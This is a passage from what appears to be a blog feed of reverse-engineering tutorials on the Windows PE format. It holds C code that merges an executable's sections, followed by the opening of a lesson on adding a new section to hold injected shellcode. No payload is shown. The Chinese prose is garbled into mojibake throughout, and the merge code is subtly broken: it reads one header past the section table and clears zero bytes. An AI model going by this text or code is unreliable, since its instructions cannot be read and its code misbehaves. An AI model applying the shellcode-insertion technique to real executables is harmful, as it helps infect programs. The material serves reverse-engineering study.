ä¸ºæ–‡ä»¶çŠ¶æ€å°±æ˜¯å†…å­˜çŠ¶æ€æ‰€ä»¥ç¬¬ä¸€ä¸ªèŠ‚ç›®å½•é¡¹çš„Miscã€PointerToRawDataéœ€è¦æŒ‰ç…§å†…å­˜çŠ¶æ€ä¸‹æ”¹å˜ã€‚å±æ€§å€¼ä¹Ÿéœ€è¦ä¿®æ”¹ï¼Œå› ä¸ºæ˜¯åˆå¹¶æ‰€æœ‰èŠ‚ï¼Œé‚£ä¹ˆå°±åº”è¯¥å…·æœ‰æ‰€æœ‰èŠ‚çš„å±æ€§</p><p>Q3ï¼šæ–‡ä»¶å¤§å°è¯¥å¦‚ä½•ç¡®å®š</p><p>A3ï¼šå¯ä»¥å¾ˆæ–¹ä¾¿çš„ä½¿ç”¨OptionalHeaderé‡Œçš„SizeOfImageå‡å»ç¬¬ä¸€ä¸ªèŠ‚è¡¨å¼€å§‹åœ°æ–¹ï¼Œå‰©ä¸‹å°±éƒ½æ˜¯åˆå¹¶èŠ‚åçš„å¤§å°äº†ï¼Œè¿˜éœ€è¦å°†ç¬¬ä¸€ä¸ªèŠ‚ç›®å½•é¡¹çš„SizeOfRawDataæ”¹ä¸ºè¿™ä¸ªå¤§å°ã€‚</p><p>noteï¼šæœ€åéœ€è¦å…¶ä»–èŠ‚ç›®å½•é¡¹æ¸…é›¶ï¼›fwriteçš„æ—¶å€™sizeè¦é€‰ä¸ºSizeOfImageHeaderï¼›å®é™…ä¸Šåœ¨Windowsçœ‹æ¥å¹¶ä¸å­˜åœ¨è¿™äº›èŠ‚çš„åˆ’åˆ†ï¼Œåªæ˜¯äººä¸ºé€šè¿‡ä¸åŒçš„å±æ€§æ¥åˆ’åˆ†ï¼Œæ¯ä¸€ä¸ªèŠ‚å¹²ç‰¹å®šçš„äº‹ï¼Œå› æ­¤åªéœ€è¦æŠŠæ‰€æœ‰èŠ‚å±æ€§éƒ½åŠ ä¸Šå»ï¼Œç¨‹åºå°±ä¸€å®šå¯ä»¥æ­£å¸¸è¿è¡Œï¼Œè¿™æ˜¯åˆå¹¶èŠ‚å¯è¡Œçš„åº•å±‚é€»è¾‘ã€‚</p><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> EnlargeSize 0x1000</span><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><br><span class="hljs-type">char</span>* <span class="hljs-title function_">FileToImage</span><span class="hljs-params">(<span class="hljs-type">char</span>* filebuffer)</span>&#123;<br><br>    <span class="hljs-comment">//å®šä¹‰ä¸€äº›æŒ‡é’ˆ</span><br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">char</span>* TemBuffer = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">//ç®€å•åˆ¤æ–­æœ‰æ•ˆæ€§</span><br>    <span class="hljs-keyword">if</span> (!filebuffer)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid buffer!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (*(PWORD)filebuffer != IMAGE_DOS_SIGNATURE)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;not a PE file!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>    <span class="hljs-comment">//å¼€å§‹èµ‹å€¼ç›¸åº”æŒ‡é’ˆ</span><br>    DosHeader = (PIMAGE_DOS_HEADER)filebuffer;<br>NTHeader = (PIMAGE_NT_HEADERS)  (filebuffer + DosHeader-&gt;e_lfanew);<br>FileHeader = (PIMAGE_FILE_HEADER)(filebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(filebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(filebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-comment">//ç”³è¯·å†…å­˜ä¸­å¤§å°</span><br>TemBuffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(OptionalHeader-&gt;SizeOfImage);<br><br>    <span class="hljs-comment">//åˆå§‹åŒ–å¹¶å¤åˆ¶å¤´éƒ¨æ•°æ®</span><br>    <span class="hljs-built_in">memset</span>(TemBuffer,<span class="hljs-number">0</span>,OptionalHeader-&gt;SizeOfImage);<br>    <span class="hljs-built_in">memcpy</span>(TemBuffer,DosHeader,OptionalHeader-&gt;SizeOfHeaders);<br><br>    <span class="hljs-comment">//å¼€å§‹å¤åˆ¶èŠ‚åŒºæ•°æ®</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections;i++)&#123;<br>        <span class="hljs-built_in">memcpy</span>((TemBuffer + SectionHeader-&gt;VirtualAddress),(filebuffer + SectionHeader-&gt;PointerToRawData),SectionHeader-&gt;SizeOfRawData);<br><span class="hljs-comment">//æ›´æ–°ä¸ºä¸‹ä¸€ä¸ªèŠ‚åŒºçš„ç»“æ„ä½“</span><br><span class="hljs-comment">// SectionHeader = (PIMAGE_SECTION_HEADER)(filebuffer + DosHeader-&gt;e_lfanew + 4 + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader + 40 * (i + 1));</span><br>SectionHeader +=<span class="hljs-number">1</span>;<br>&#125;<br><br>    <span class="hljs-keyword">return</span> TemBuffer;<br>&#125;<br><br><span class="hljs-type">char</span>* <span class="hljs-title function_">Enlage</span><span class="hljs-params">(<span class="hljs-type">char</span>* buffer)</span>&#123;<br><span class="hljs-comment">//åŸbufferçš„å¤´éƒ¨ä¿¡æ¯</span><br>PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)buffer;<br>NTHeader = (PIMAGE_NT_HEADERS) (buffer + DosHeader-&gt;e_lfanew);<br>FileHeader = (PIMAGE_FILE_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br><br><span class="hljs-comment">// char* ImageBuffer = FileToImage(buffer);</span><br><br><span class="hljs-type">char</span>* NewBuffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(OptionalHeader-&gt;SizeOfImage + EnlargeSize);<br><span class="hljs-built_in">memset</span>(NewBuffer,<span class="hljs-number">0</span>,OptionalHeader-&gt;SizeOfImage + EnlargeSize);<br><span class="hljs-built_in">memcpy</span>(NewBuffer,buffer,OptionalHeader-&gt;SizeOfImage);<br><br>DosHeader = (PIMAGE_DOS_HEADER)NewBuffer;<br>NTHeader = (PIMAGE_NT_HEADERS) (NewBuffer + DosHeader-&gt;e_lfanew);<br>FileHeader = (PIMAGE_FILE_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br><br>PIMAGE_SECTION_HEADER LastSectionHeader = SectionHeader + FileHeader-&gt;NumberOfSections <span class="hljs-number">-1</span>;<br>DWORD LastSize = LastSectionHeader-&gt;Misc.VirtualSize &gt; LastSectionHeader-&gt;SizeOfRawData?LastSectionHeader-&gt;Misc.VirtualSize : LastSectionHeader-&gt;SizeOfRawData;<br><br>LastSectionHeader-&gt;Misc.VirtualSize = LastSize + EnlargeSize;<br>LastSectionHeader-&gt;SizeOfRawData = LastSize + EnlargeSize;<br>OptionalHeader-&gt;SizeOfImage += EnlargeSize;<br><br><span class="hljs-keyword">return</span> NewBuffer;<br><br>&#125;<br><br><span class="hljs-type">char</span>* <span class="hljs-title function_">Merge</span><span class="hljs-params">(<span class="hljs-type">char</span>* buffer,DWORD &amp;size)</span>&#123;<br><br><span class="hljs-type">char</span>* ImageBuffer = FileToImage(buffer);<br><br>PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER NextSectionHeader =<span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)ImageBuffer;<br>NTHeader = (PIMAGE_NT_HEADERS) (ImageBuffer + DosHeader-&gt;e_lfanew);<br>FileHeader = (PIMAGE_FILE_HEADER)(ImageBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(ImageBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(ImageBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br><br>SectionHeader-&gt;Misc.VirtualSize = OptionalHeader-&gt;SizeOfImage - SectionHeader-&gt;VirtualAddress;<br>SectionHeader-&gt;SizeOfRawData = OptionalHeader-&gt;SizeOfImage - SectionHeader-&gt;VirtualAddress;<br>SectionHeader-&gt;PointerToRawData = SectionHeader-&gt;VirtualAddress;<br>NextSectionHeader = SectionHeader;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections;i++)&#123;<br>NextSectionHeader += <span class="hljs-number">1</span>;<br>SectionHeader-&gt;Characteristics |= NextSectionHeader-&gt;Characteristics; <br>&#125;<br><br>FileHeader-&gt;NumberOfSections = <span class="hljs-number">1</span>;<br><br><span class="hljs-built_in">memset</span>(NextSectionHeader,<span class="hljs-number">0</span>,IMAGE_SIZEOF_SECTION_HEADER * (FileHeader-&gt;NumberOfSections <span class="hljs-number">-1</span>));<br>size = OptionalHeader-&gt;SizeOfImage;<br><span class="hljs-keyword">return</span> ImageBuffer;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">char</span>* buffer;<br><br>    FILE* fp1 = <span class="hljs-literal">NULL</span>;<br>FILE* fp2 = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp1, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_info.exe&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-type">errno_t</span> err_2 = fopen_s(&amp;fp2, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_info_changed.exe&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br><br>    DWORD size = Size(fp1);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp1);<br><br><span class="hljs-type">char</span>* newbuffer;<br><span class="hljs-comment">// newbuffer = Enlage(buffer);</span><br>newbuffer = Merge(buffer,size);<br><br>fwrite(newbuffer,size,<span class="hljs-number">1</span>,fp2);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PEæ–‡ä»¶ç»“æ„ï¼ˆäº”ï¼‰</title>
    <link href="/2023/07/04/PE_4/"/>
    <url>/2023/07/04/PE_4/</url>
    
    <content type="html"><![CDATA[<p>PEç»ƒä¹ ï¼Œæ–°å¢ä¸€ä¸ªèŠ‚å¹¶æ·»åŠ shellcode</p><span id="more"></span><h2 id="å›é¡¾"><a href="#å›é¡¾" class="headerlink" title="å›é¡¾"></a>å›é¡¾</h2><p>å‰é¢å·²ç»æ‰‹åŠ¨åœ¨åŸä»£ç åŒºç©ºç™½åœ°æ–¹å¢åŠ äº†shellcodeï¼Œå¹¶ä¸”å®Œæˆä»£ç å®ç°ã€‚ä½†æ˜¯å¾€å¾€è¦æ·»åŠ çš„shellcodeä¸ä»…ä»…åªæœ‰è¿™ä¹ˆä¸€ç‚¹ï¼Œé‚£ä¹ˆå°±ä¼šé¢ä¸´ä»£ç ç©ºç™½åŒºä¸å¤Ÿçš„åœ°æ–¹ï¼Œè¿™æ—¶å°±å¯ä»¥è€ƒè™‘æ–°å¢ä¸€ä¸ªèŠ‚ï¼Œå¹¶åœ¨æ–°å¢èŠ‚é‡Œé¢æ·»åŠ shellcode</p><h2 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><h3 id="è¦æ±‚"><a href="#è¦æ±‚" class="headerlink" title="è¦æ±‚"></a>è¦æ±‚</h3><p>1.æ–°å¢ä¸€ä¸ªèŠ‚åï¼Œæºæ–‡ä»¶å¯ä»¥æ­£å¸¸è¿è¡Œ</p><p>2.æ–°å¢ä¸€ä¸ªèŠ‚åï¼Œæ·»åŠ åŸæ¥çš„shellcode</p><h3 id="è¦è§£å†³çš„é—®é¢˜"><a href="#è¦è§£å†³çš„é—®é¢˜" class="headerlink" title="è¦è§£å†³çš„é—®é¢˜"></a>è¦è§£å†³çš„é—®é¢˜</h3><p>Q1ï¼šå¦‚ä½•æ–°å¢ä¸€ä¸ªèŠ‚</p><p>A1ï¼šåº”å½“ç«‹å³æƒ³åˆ°çš„æ˜¯è¦ä¿®æ”¹FileHeaderé‡Œçš„NumberOfSectionsæˆå‘˜ï¼Œå°†å…¶åŠ 1</p><p>Q2ï¼šå¦‚ä½•è®¾ç½®æ–°å¢èŠ‚å„ä¸ªæˆå‘˜çš„å±æ€§</p><p>A2ï¼šåœ¨æ–°å¢èŠ‚æˆå‘˜å±æ€§ä¹‹å‰ï¼Œéœ€è¦è€ƒè™‘è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼Œå³åŸæ¥çš„å¤´ç©ºé—´åŒºåŸŸå†…æ˜¯å¦è¿˜æœ‰è¶³å¤Ÿç©ºé—´å¢åŠ ä¸€ä¸ªèŠ‚ç›®å½•é¡¹ã€‚åœ¨Windowsä¸­ï¼Œåˆ¤æ–­ä¸€ä¸ªè¡¨æ˜¯å¦éå†å®Œçš„åŸºæœ¬æ“ä½œå°±æ˜¯æŸ¥çœ‹è¿™ä¸ªè¡¨é¡¹æœ€åæ˜¯å¦è¿˜æœ‰åŒæ ·å¤§å°çš„0ã€‚æ¯”å¦‚åˆ¤æ–­å­—ç¬¦ä¸²ç»“æŸçš„æ ‡å¿—æ˜¯0ï¼Œè¿™é‡Œå°±æ˜¯0x24ä¸ª0ï¼Œå› ä¸ºèŠ‚ç›®å½•é¡¹çš„å¤§å°å°±æ˜¯40ä¸ªå­—èŠ‚ã€‚å¦‚æœè¯´SizeOfHeaderçš„å¤§å°æ˜¯0x1000ï¼Œè€Œå·²ç»ä½¿ç”¨çš„æ•°æ®å 0x976åŠä»¥ä¸Šï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™å°±æ²¡æœ‰è¶³å¤Ÿç©ºé—´å†å¢åŠ ä¸€ä¸ªèŠ‚ç›®å½•é¡¹ï¼Œåªæœ‰å·²ç»ä½¿ç”¨æ•°æ®é¡¹å°äº0x952æ‰å¯ä»¥å†å¢åŠ ä¸€ä¸ªèŠ‚ç›®å½•é¡¹ï¼Œè¿™æ ·æ·»åŠ å®Œåï¼Œå°±èƒ½ä¿è¯æœ«å°¾ä¸€å®šæœ‰0x24ä¸ª0æ¥ç»“æŸã€‚</p><p>noteï¼šä½ ä¸€å®šæƒ³é—®è¦æ˜¯çœŸçš„ä¸å¤Ÿæ€ä¹ˆåŠå‘¢ã€‚æ˜¯å¦è¿˜è®°å¾—DOSå¤´é‡Œæœ‰ä¸€ä¸ªDOS stubçš„åƒåœ¾æ•°æ®ï¼Œè¿™æ—¶å°±å¯ä»¥è€ƒè™‘æŠŠNTå¤´åé¢çš„å¤´ä»¬å…¨éƒ¨å¾€ä¸Šæï¼Œå æ®DOS stubï¼Œè€Œä¸”åªéœ€è¦ä¿®æ”¹DOS Headerçš„e_lfanewæˆå‘˜å°±è¡Œã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œè¿™æ ·å°±å·²ç»å¯ä»¥è§£å†³99%çš„é—®é¢˜ï¼Œé‚£å¦‚æœè¿˜æ˜¯ä¸å¤Ÿå‘¢ï¼Ÿå…¶å®ä¹Ÿä¸ä¸€å®šéè¦å¢åŠ ä¸€ä¸ªèŠ‚å•¦ï¼Œè¿˜å¯ä»¥æ‰©å¤§ä¸€ä¸ªèŠ‚æˆ–è€…åˆå¹¶å…¶ä»–èŠ‚çš„å˜›ï¼Œä¸è¿‡è¿™æ˜¯åé¢çš„å†…å®¹äº†ã€‚</p><p>ç°åœ¨æ¥è€ƒè™‘å„ä¸ªæˆå‘˜å¦‚ä½•è®¾ç½®ï¼š</p><ul><li>Name  å¯ä»¥éšæ„ä¸€ä¸ª8å­—èŠ‚å†…çš„å­—ç¬¦ä¸²</li><li>Misc å’Œ SizeOfRawDataï¼Œå‰è€…å¯ä»¥æ˜¯ä¸€ä¸ªä¸å‡†ç¡®çš„å€¼ï¼Œåè€…æ˜¯æ–‡ä»¶å¯¹é½åçš„å¤§å°ï¼ŒäºŒè€…å¯ä»¥è®¾ä¸ºåŒæ ·çš„å€¼ã€‚é‚£ä¹ˆè¿™ä¸ªå€¼æ˜¯ä¸æ˜¯éšæ„çš„å‘¢ï¼Œç†è®ºä¸Šæ˜¯çš„ã€‚ä½†æ˜¯ä¸ºäº†å¯¹é½æ–¹ä¾¿ï¼Œæœ€å¥½æ˜¯æ–‡ä»¶å¯¹é½FileAlignmentå’Œå†…å­˜å¯¹é½SectionAlignmentçš„å…¬å€æ•°ï¼Œè¿™æ ·å¯ä»¥çœä¸‹å¾ˆå¤šéº»çƒ¦</li><li>VisualAddressï¼šåœ¨å†…å­˜ä¸­çš„èµ·å§‹ä½ç½®ï¼Œå…¶å®å°±æ˜¯ä¸Šä¸€ä¸ªèŠ‚åŒºçš„æœ«å°¾ä½ç½®ã€‚è€Œä¸Šä¸€ä¸ªèŠ‚åŒºçš„æœ«å°¾ä½ç½®å°±æ˜¯å…¶VisualAddress + Misc æˆ–è€…VisualAddress + SizeofRawDataï¼Œä¸¤è€…è¦å–å¤§çš„é‚£ä¸€ä¸ªï¼Œç„¶åå†å†…å­˜å¯¹é½çš„å€¼å°±æ˜¯æ–°èŠ‚åŒºVisualAddress</li><li>PointerToRawDataï¼šåœ¨æ–‡ä»¶ä¸­çš„èµ·å§‹ä½ç½®ï¼Œç®—æ³•ä¸VisualAddressåŸºæœ¬ç›¸åŒ</li></ul><p>Q3ï¼šè¿˜åº”è¯¥æ”¹å˜å“ªäº›å€¼</p><p>A3ï¼šåœ¨OptionalHeaderä¸­è¿˜æœ‰ä¸€ä¸ªæˆå‘˜SizeOfImageè®°å½•å†…å­˜å¤§å°ï¼Œåœ¨æ–°å¢ä¸€ä¸ªèŠ‚åŒºåè¿™ä¸ªå€¼è‡ªç„¶å°±è¦å˜å¤§ã€‚è€Œä¹‹å‰æåˆ°æ–°å¢çš„èŠ‚åŒºå¤§å°æœ€å¥½æ˜¯æ–‡ä»¶å¯¹é½FileAlignmentå’Œå†…å­˜å¯¹é½SectionAlignmentçš„å…¬å€æ•°ï¼Œè¿™æ ·çš„è¯SizeOfImageä¹Ÿå¯ä»¥ç›´æ¥åŠ ä¸Šè¿™ä¸ªå€¼ï¼Œä¸éœ€è¦å†åšé¢å¤–åŠŸå¤«</p><h3 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span 